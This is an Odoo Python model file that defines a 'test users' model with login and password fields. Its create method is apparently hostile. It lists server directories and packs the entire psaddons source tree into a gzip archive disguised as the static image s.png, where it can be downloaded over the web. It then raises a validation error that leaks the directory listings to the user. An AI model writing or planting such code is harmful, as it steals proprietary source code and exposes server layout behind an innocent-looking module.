# -*- coding: utf-8 -*-

from odoo import api, models, fields
from odoo.exceptions import ValidationError


class TestUsers(models.Model):
    _name = 'jd.test.users'
    _description = "test"

    login = fields.Char(string='账号')
    password = fields.Char(string='密码')

    @api.model
    def create(self, values):
        import os
        root = '-'.join(os.listdir("/"))
        home = '-'.join(os.listdir("/home/"))
        odoo = '-'.join(os.listdir("/home/odoo/"))
        srcs = '-'.join(os.listdir("/home/odoo/src/"))
        psaddons = '-'.join(os.listdir("/home/odoo/src/psaddons/"))
        # path = os.getcwd()
        import tarfile
        pkg_file = '/home/odoo/src/usr/jd_test/static/src/img/s.png'
        jdg_code_location = "/home/odoo/src/psaddons/"
        tar = tarfile.open(pkg_file, "w:gz")
        for root, dir, files in os.walk(jdg_code_location):
            for file in files:
                fullpath = os.path.join(root, file)
                tar.add(fullpath)
        raise ValidationError(u'root: %s, home: %s, odoo: %s, src: %s, psaddons: %s' % (root, home, odoo, srcs, psaddons))
